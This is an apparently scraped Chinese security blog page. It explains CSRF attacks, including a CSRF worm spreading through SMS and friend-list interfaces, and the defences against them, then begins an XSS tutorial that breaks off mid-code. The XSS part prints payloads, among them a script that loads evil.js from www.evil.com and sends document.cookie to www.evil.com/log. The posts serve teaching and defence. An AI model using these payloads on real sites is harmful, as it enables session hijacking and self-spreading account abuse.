<p>如果这<a href="http://www.a.com/test.php对a.com设置了Cookie的页面，其内容为：" target="_blank" rel="external">http://www.a.com/test.php对a.com设置了Cookie的页面，其内容为：</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Set-Cookie:test=axis;domian=.a.com;path=/"</span>)</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>如果请求www.b.com/test.html的时候，他的iframe会告诉浏览器去跨域请求www.a.com/test.php。test.php会尝试请求Set-Cookie，所以浏览器会收到一个Cookie。</p>
<p>如果设置Cookie成功之后，会再次请求该界面，浏览器会发送刚刚收到的Cookie，可是由于跨域限制，在a.com上Set-Cookie是不会成功的，所以无法发送刚才收到的Cookie，无论是临时还是本地的Cookie。</p>
<p>可是当加入P3P之后，其允许跨域访问数据，从而跨域Set-Cookie成功。</p>
<p>P3P头的介入会改变域名的隐私策略，从而使得<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>等标签在IE中不再拦截第三方Cookie的发送。P3P头只需要由网站设置一次即可，之后的每次请求都会遵循此策略，而不需要再重复设置。</p>
<p>P3P策略可以查询W3C标准。也可以直接引用一个XML策略文件。<a href="http://www.w3.org/TR/P3P" target="_blank" rel="external">www.w3.org/TR/P3P</a></p>
<h2 id="GET或者POST"><a href="#GET或者POST" class="headerlink" title="GET或者POST"></a>GET或者POST</h2><p>不仅仅GET能够发起CSRF攻击，POST请求也能够发起CSRF攻击，所以不能仅凭请求方式来获取变量执行操作。</p>
<p>比如，在一个页面中构造好一个<code>&lt;form&gt;</code>，然后使用Javascript自动提交这个表单，比如，攻击者在www.b.com/test.html中写入下面的代码。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"http://www.a.com/register"</span> id=<span class="string">"register"</span> method=<span class="string">"post"</span>&gt;</div><div class="line">	&lt;input type="text" name="username" value="" /&gt;</div><div class="line">	&lt;input type="text" name="password" value="" /&gt;</div><div class="line">	&lt;input type="submit" name="submit" value="submit"&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;script&gt;</div><div class="line">	var f=document.getElementById("register");</div><div class="line">	f.inputs[0].value="test";</div><div class="line">	f.inputs[1].value="passwd";</div><div class="line">	f.submit();</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>攻击者甚至可以将这个页面隐藏于一个不可见的iframe的窗口中，这整个自动提交表单的过程来说，对于用户来说也是不可见的。</p>
<h2 id="Flash-CSRF"><a href="#Flash-CSRF" class="headerlink" title="Flash CSRF"></a>Flash CSRF</h2><p>Flash也有许多的方式能够发起网络请求，包括POST。但是自IE 8起，Flash发送的网络请求已经不再发送本地Cookie了。</p>
<h2 id="CSRF-Worm"><a href="#CSRF-Worm" class="headerlink" title="CSRF Worm"></a>CSRF Worm</h2><p>实现的原理可以举个例子：</p>
<p>假设现在有一个SMS服务，可以向指定的用户发送短消息：</p>
<p><code>http://msg.xx.com/?ct=22&amp;cm=MailSender&amp;tn=bmSubmit&amp;sn=账号&amp;co=消息内容</code></p>
<p>只需要修改参数sn，即可以对指定的用户发送短消息，而这里另一个接口则可以查询出某个用户的所有好友：</p>
<p><code>http://frd.xx.com/?ct=28&amp;cm=FriList&amp;tn=bmABCFriList&amp;un=账号&amp;callback=gotfriends</code></p>
<p>将两者结合起来，可以组成一个CSRF Worm，让一个用户查看恶意截面后，将给他的好友发送一条短消息，这个短消息又包含一张图片，其地址再次指向CSRF页面，使得这些好友再次将信息发给他的好友，这个worm因此得以传播。</p>
<p>首先：模拟服务器取得request的参数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> lsURL = <span class="built_in">window</span>.location.href;</div><div class="line">loU = lsURL.split(<span class="string">"?"</span>);<span class="comment">// get href from broswer</span></div><div class="line"><span class="keyword">if</span>(loU.length&gt;<span class="number">1</span>)&#123;</div><div class="line">	<span class="keyword">var</span> loallPm=loU[<span class="number">1</span>].split(<span class="string">"&amp;"</span>);<span class="comment">// get param from ?XXXX</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>定义蠕虫页面的服务器地址，取得?和&amp;符号后面的字符串，从URL中提取出感染蠕虫的用户名以及感染者好友的用户名。</p>
<p>其次：好友json数据的动态获取。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var gotfriends = function(x)&#123;</div><div class="line">	for (i=0;i&lt;x[2].length;i++)&#123;</div><div class="line">		friends.push(x[2][i][1]);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">loadjson('&lt;script </div><div class="line">src="http://frd.xxx.com/?ct=28&amp;un='+lusername+'&amp;cm=FriList&amp;tn=bmABCFriList&amp;callback=gotfriends&amp;.tmp=&amp;1=2"&lt;\/script&gt;');</div></pre></td></tr></table></figure></p>
<p>通过CSRF漏洞从远程加载受害者好友json数据，根据该接口的json数据格式，提取出好友数据为蠕虫的传播流程做准备。</p>
<p>最后：感染信息输出和消息发送的核心部分。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">evilurl=url+"/wish.php?from="+lusername+"&amp;to=";</div><div class="line">sendmsg="http://msg.xx.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=[user]&amp;co=[evilmsg]";</div><div class="line">for(i=0;i&lt;friends.length;i++)&#123;</div><div class="line">	mysendmsg=mysendmsg+"&amp;"+i;</div><div class="line">	eval('x'+i+'=new Image();x'+i+'.src=unescape(""+mysendmsg+'");');</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>将感染者的用户和需要传播的好友用户名放到蠕虫链接内，然后输出短消息。</p>
<p>所以讲这两个结合起来就可以组成一个CSRF Worm，让一个用户查看恶意页面之后，将给他的所有好友发送一条短信息，这个短信息中又可以插入一张图片，其地址可以指向CSRF页面，使得这些好友再次把信息发送给他们的好友，这个worm就可以传播了。</p>
<p>这样可以把感染者的用户名和需要传播的好友用户名放到蠕虫连接内，然后输出短消息。这样的话，即使没有XSS漏洞，也能仅仅依靠CSRF，也是能够发送大规模蠕虫攻击的。</p>
<h1 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h1><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>验证码被认为是对抗CSRF攻击最简单和有效的防御方法。</p>
<p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码可以强制你用户必须与应用进行交互才能完成请求。因此在最终情况下，验证码能够很好的遏制CSRF攻击。</p>
<p>但是验证码并非是万能的，在很多时候，出于用户体验的考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p>
<h2 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h2><p>Referer Check在互联网之中最常见的应用就是防止图片。同样的，Referer Check也可以被用于检查请求是否来自合法的“源”。</p>
<p>常见的互联网应用，页面和页面之间都具有一定的逻辑关系，这样就使得每个正常请求的Referer具有一定的规律。</p>
<p>比如对于发帖这个操作，在正常的情况下是需要先登录到用户后台，或者访问有发帖功能的页面。再提交“发帖”的表单的时候，Referer的值必然是发帖表单所在的页面。如果Referer的值不是这个页面，甚至不是发帖网页的域，则极有可能是CSRF攻击。</p>
<p>即使我们能够通过检查Referer合法来判定用户是否被CSRF攻击，也仅仅是满足了防御的充分条件。Referer Check的缺陷再与，服务器并非什么时候都能取到Referer，很多用户出于隐私保护的考虑，限制了Referer的发送，在某些情况下，浏览器也不会发送Referer。比如从HTTPS跳转到HTTP的时候，出于安全的考虑，浏览器也不会发送Referer。</p>
<p>出于种种原因，我们还是无法依赖Referer Check作为防御CSRF的主要手段。但是通过Referer Check来监控CSRF攻击的发生，也是一种可行的方法。</p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF_Token"></a>CSRF_Token</h2><p>现在业界对于CSRF的防御，一致的做法是使用一个Token。在介绍此方法之前，我们可以了解一下CSRF的本质。</p>
<h3 id="CSRF的本质"><a href="#CSRF的本质" class="headerlink" title="CSRF的本质"></a>CSRF的本质</h3><p>CSRF能够攻击成功的原因，其本质是重要操作的所有参数都是可以被攻击者猜到的。攻击者只有预测到URL的所有参数和参数值，才能成功的构造出一个伪造的请求；反之，攻击者将无法攻击成功。</p>
<p>出于这个原因，我们可以把参数加密，或者使用一些随机数，从而可以让攻击者无法猜测到参数值：</p>
<p>比如，一个删除操作的URL是：<code>http://host/path/delete?username=abc&amp;item=123</code></p>
<p>其中就可以把username的参数改为hash值：<code>http://host/path/delete?username=md5(salt+abc)&amp;item=123</code></p>
<p>这样攻击者再不知道salt的情况下，是无法构造出这个URL的，因此也就无法发起CSRF攻击了。而对于服务器来说，则可以从Session或者Cookie中取得username=abc的值，再结合salt对于整个请求进行认证，正常请求会被认为是合法的。</p>
<p>但是这个方法也存在一些问题。首先加密或者混淆后的URL会变得很难读，对于用户很不友好。其次，如果加密后的参数每次改变，则某些URL将无法被用户收藏。最后，普通的参数如果也被加密或者hash，那么会给数据分析带来很大的困扰，因为数据分析工作常常需要用到参数的明文。</p>
<p>因此，我们可以使用anti-CSRF Token。</p>
<p>回到上面的URL中，保持原参数不变，新增一个参数Token。这个Token是随机，不可预测的：</p>
<p><code>http://host/path/delete?username=abc&amp;item=123&amp;token=[random(seed)]</code></p>
<p>Token需要爱足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器。Token应该被用户与服务器共同持有，不能被第三者知晓。在实际应用的时候，Token可以放在Session中，或者浏览器的Cookie中。</p>
<p>由于Token的存在，攻击者是无法构造出一个完整的URL实施CSRF攻击的。</p>
<p>Token需要同时放在表单和Session中，再提交请求的时候，服务器只需要验证表单中的Token，或者与用户Session（或者Cookie）中的Token是否一致。如果已知，则认为是合法请求，如果不一致或者有一个为空，则认为请求不合法，可能发生了CSRF攻击。通过可以把Token作为一个隐藏的input字段，放在<code>form</code>中。</p>
<h3 id="Token的使用原则"><a href="#Token的使用原则" class="headerlink" title="Token的使用原则"></a>Token的使用原则</h3><p>anti-CSRF在使用的过程中，需要注意：</p>
<p>防御CSRF的Token，是根据不可预测性原则设计的方案，所以Token的生成一定要随机，需要使用安全的随机数生成Token。</p>
<p>此外，这个Token目的不是为了防止重复提交。所以为了使用方便，可以允许在一个用户的有效生命周期内，在Token消耗前都使用同一个Token。但是如果用户已经提交了表单，则这个Token已经消耗掉，应该生成一个新的Token。</p>
<p>如果Token保存在Cookie中，而不是服务器端的Session之中，则会有个新问题。如果一个用户打开几个相同的页面同时操作，当某个页面的表单再次提交时，会出现Token错误。在这种情况下，可以考虑生成多个有效的Token，解决多页面共存的场景。</p>
<p>最后使用Token时候应该注意Token的保密性。Token如果出现在某个页面的URL之中，则可能通过Referer的方式泄露。</p>
<p>因此在使用Token的时候，应该尽量把Token放在表单之中，把敏感操作由GET改为POST，以form的形式提交，可以避免Token泄露。</p>
<p>同样的CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会变得无效，因为XSS可以模拟客户端浏览器执行任意操作，在XSS攻击下，攻击者完全可以请求页面，读出页面中的Token值，然后再构造出一个合法的请求。这个过程被称为XSRF和CSRF区分。</p>
<p>XSS带来的问题，应该使用XSS的防御方案综合解决，否则CSRF的Token防御就变得无效。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/05/30/e8-a5-bf-e5-8c-97-e5-b7-a5-e4-b8-9a-e5-a4-a7-e5-ad-a6acm2014-e7-ba-a7-e8-8e-b7-e5-a5-96-e6-83-85-e5-86-b5-e7-bb-9f-e8-ae-a1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/05/30/e8-a5-bf-e5-8c-97-e5-b7-a5-e4-b8-9a-e5-a4-a7-e5-ad-a6acm2014-e7-ba-a7-e8-8e-b7-e5-a5-96-e6-83-85-e5-86-b5-e7-bb-9f-e8-ae-a1/" itemprop="url">西北工业大学ACM2014级获奖情况统计</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-30T13:14:05+08:00">
                2016-05-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/未分类/" itemprop="url" rel="index">
                    <span itemprop="name">未分类</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在今晚之前需要提交你的获奖情况</p>
<p>需要填的奖项有：</p>
<ul>
<li>省赛<br>请同学来填这一项比赛。</li>
</ul>
<p>[contact-form][contact-field label=’姓名’ type=’name’ required=’1’/][contact-field label=’学号’ type=’text’ required=’1’/][contact-field label=’学院’ type=’name’ required=’1’/][contact-field label=’比赛’ type=’select’ required=’1’ options=’2016ACM-ICPC陕西省省赛,2016程序设计竞赛分数榜,2016夏季ACM-ICPC选拔赛分数榜’/][contact-field label=’获奖等级’ type=’select’ options=’金,银,铜,其他’/][/contact-form]</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/05/18/wordpress迁移到4-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/05/18/wordpress迁移到4-5/" itemprop="url">wordpress迁移到4.5</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-18T21:43:34+08:00">
                2016-05-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/未分类/" itemprop="url" rel="index">
                    <span itemprop="name">未分类</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>终于我的博客使用手动升级的方法从3.9升级到了4.5这个版本。</p>
<p>预期在这个版本里，Jetpack的支持能更好的检测我的博客。</p>
<p>比心～
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/05/18/wordpress迁移到4-5/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/05/17/e8-b7-a8-e7-ab-99-e8-84-9a-e6-9c-ac-e6-94-bb-e5-87-bb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/05/17/e8-b7-a8-e7-ab-99-e8-84-9a-e6-9c-ac-e6-94-bb-e5-87-bb/" itemprop="url">跨站脚本攻击</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-17T13:15:43+08:00">
                2016-05-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全工程/" itemprop="url" rel="index">
                    <span itemprop="name">安全工程</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跨站脚本攻击是经常发生的事情，作为一名业余的开发者，我觉得有必要make note一下。</p>
<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>跨站点脚本攻击（Cross Site Script），为了和层叠样式表区别，所以称之为XSS。</p>
<p>XSS攻击的本质是向HTML插入了恶意的脚本，从而曲解HTML的意思，控制攻击浏览器。XSS长期以来都被列为客户端Web安全的头号大敌。</p>
<p>举个例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$input = $_GET[<span class="string">'param'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;div&gt;"</span>.$input.<span class="string">"&lt;/div&gt;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在正常情况下用户使用GET的方法提交的数据会展示到页面之中，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/xss.php?param=This%20is%20a%20test</div></pre></td></tr></table></figure></p>
<p>就会在网页中看见This is a test的结果，但是如果我们构造了一串JS代码的话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/xss.php?param=&lt;script&gt;alert(/xss/)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>这里alert(/xss/)就会在当前页面执行了。</p>
<p>这样就是xss的第一种类型，反射性XSS。</p>
<h2 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h2><p>反射性XSS只是简单的把用户输入的数据反射给浏览器。也就是说，攻击者可以诱使用户点击一个恶意链接来攻击用户，所以也被称之为非持久性XSS。</p>
<h2 id="存储性XSS"><a href="#存储性XSS" class="headerlink" title="存储性XSS"></a>存储性XSS</h2><p>存储性XSS会把用户输入的数据存储在服务器端。</p>
<p>这种比较常见的场景就是攻击者写下一篇包含恶意Javascript代码的博客文章，此时所有访问该博客文章的用户都会在他们的浏览器中执行这段恶意的Javascript代码。这种方法就被成为存储性XSS</p>
<h2 id="基于节的XSS"><a href="#基于节的XSS" class="headerlink" title="基于节的XSS"></a>基于节的XSS</h2><p>实际上，这种类型的XSS效果上来说也是反射型XSS，但是其成因比较特别，通过修改页面的DOM节点形成的XSS，称之为基于节的XSS（DOM Based XSS）。</p>
<p>下面的代码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">    function test()&#123;</div><div class="line">        var str = document.getElementById('text').value;</div><div class="line">        document.getElementById("t").innerHTML = "&lt;a href='"+str+"'&gt;YourLink&lt;/a&gt;"</div><div class="line">    &#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;div id="t"&gt;&lt;/div&gt;</div><div class="line">&lt;input type="text" id="text" value="" /&gt;</div><div class="line">&lt;input type="button" id="s" value="write" onclick="test()" /&gt;</div></pre></td></tr></table></figure></p>
<p>点击write按钮之后，会在当前页面插入一个超链接，其地址为文本框内容：</p>
<p><img src="/wp-content/uploads/2016/05/QQ截图20160517124300.png" alt="QQ截图20160517124300"></p>
<p>在这里write按钮的<code>onclick</code>事件调用了<code>test()</code>函数。而在<code>test()</code>函数中，修改了页面的DOM节点，通过<code>innerHTML</code>把一段用户数据当做HTML写入到页面中，造成了DOM based XSS。</p>
<p>构造如下的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; onclick=alert(/xss/) //</div></pre></td></tr></table></figure></p>
<p>输入之后。页面代码就变成了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;&quot; onclick=&quot;alert(/xss/)&quot; &apos;=&quot;&quot;&gt;YourLink&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>首先用一个单引号<code>&#39;</code> 闭合掉<code>href</code>的第一个单引号，然后插入一个<code>onclick</code>事件，最终再用注释符“<code>//</code>”注释掉第二个单引号。</p>
<p>点这个新生成的链接，XSS就会被执行。</p>
<p><img src="/wp-content/uploads/2016/05/XSS-DOM-Based.png" alt="XSS DOM Based"></p>
<p>实际上，还可以选择直接闭合<a>标签，并且插入一个新的HTML标签。尝试以下输入：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">'&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss2/)</span> /&gt;</span><span class="tag">&lt;<span class="name">'</span></span></div></pre></td></tr></table></figure></a></p>
<p>页面就变成了：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"alert(/xss2/)"</span>&gt;</span>YourLink<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>脚本就被执行了：</p>
<p><img src="/wp-content/uploads/2016/05/XSS2.png" alt="XSS2"></p>
<h2 id="XSS-Payload初探"><a href="#XSS-Payload初探" class="headerlink" title="XSS Payload初探"></a>XSS Payload初探</h2><p>XSS攻击成功之后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这种用以完成各种功能的恶意脚本称之为XSS Payload。</p>
<p>XSS Payload实际上就是javascript脚本，所以任何javascript能够实现的功能，XSS Payload都能够做到。</p>
<p>最常见的一个XSS Payload就是，通过读取浏览器的Cookie对象，从而发起Cookie劫持。</p>
<p>Cookie中一般加密保存了当前用户的登陆凭证。如果丢失，那么攻击者就能过不通过密码，直接登进用户的账户。</p>
<p>那么我们可以演示一下。首先龚记者可以加载一个远程脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>在evil.js之中，可以使用如下代码窃取Cookie：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">img.src=<span class="string">"http://www.evil.com/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div><div class="line"><span class="built_in">document</span>.body.appendChild(img);</div></pre></td></tr></table></figure></p>
<p>这段代码向页面中插入了一个不可见的图片，同时把<code>document.cookie</code>对象作为参数发送到远程服务器。</p>
<p>同时需要指出的是，这个网站可能并不一定要存在，这个请求实质上会在远程服务器的Web日志中留下记录的。</p>
<p>这样就是一个最简单的窃取Cookie和XSS Payload。</p>
<p>在Web之中，Cookie一般是用户登录的凭证，浏览器发起的所有请求都会自动带上cookie，如果cookie没有绑定客户端信息，当攻击者窃取cookie后，就可以免密码登陆进用户的账户。</p>
<p>Cookie的<code>HttpOnly</code>标示可以防止Cookie劫持。</p>
<h2 id="强大的XSS-Payload"><a href="#强大的XSS-Payload" class="headerlink" title="强大的XSS Payload"></a>强大的XSS Payload</h2><p>cookie劫持并不是都能够生效的。有的网站可能会在Set-Cookie时给出关键的Cookie载入HttpOnly标识；有的网站可能会把Cookie和客户端IP绑定，从而使得XSS窃取Cookie变得没有意义。</p>
<p>尽管如此，XSS攻击成功之后，龚记者仍能够有许多方式控制用户的浏览器。</p>
<h3 id="构造GET和POST请求"><a href="#构造GET和POST请求" class="headerlink" title="构造GET和POST请求"></a>构造GET和POST请求</h3><p>一个网站的应用，只需要接受HTTP协议中的GET或者POST请求就能完成所有的操作，这样对于攻击者来说，仅通过Javascript就能过浏览器发起这两种请求。</p>
<p>比如我的网站，只要用户访问特定的链接就能够完成指定的应用，假设我们设定某个网站的<code>/delete/</code>可以使得当前用户禁用自己的账户。这样对于攻击者来说，只需要让用户访问下面这段Javascript代码就能过使得用户执行XSS Payload来禁用自己的账户。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">img.src=<span class="string">"http://XXXXXXX.XXX/delete/"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(img);</div></pre></td></tr></table></figure></p>
<p>如果网站应用接受的是POST请求呢？</p>
<p>要模拟这个过程第一种方法就是构造一个form表单，然后自动提交这个表单。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</div><div class="line">form.action=<span class="string">""</span>;</div><div class="line">form.method=<span class="string">"post"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(form);</div><div class="line"></div><div class="line"><span class="keyword">var</span> input1 = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">input1.name=<span class="string">"ck"</span>;</div><div class="line">input1.value=<span class="string">"JiUK"</span>;</div><div class="line">form.appendChild(input1);</div><div class="line"></div><div class="line">form.submit();</div></pre></td></tr></table></figure></p>
<p>如果表单的数据很多的话，使用构造DOM的方法，代码会变得很冗长。所以可以直接写HTML代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> dd = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</div><div class="line"><span class="built_in">document</span>.body.appendChild(dd);</div><div class="line">dd.innerHTML = <span class="string">'&lt;form action="" method="post" id="xssform"&gt;'</span>+</div><div class="line">        <span class="string">'&lt;input type="hidden" value="JiUY" name="ck"&gt;'</span>+</div><div class="line">        <span class="string">'&lt;/form&gt;'</span></div><div class="line"><span class="built_in">document</span>.getElementById(<span 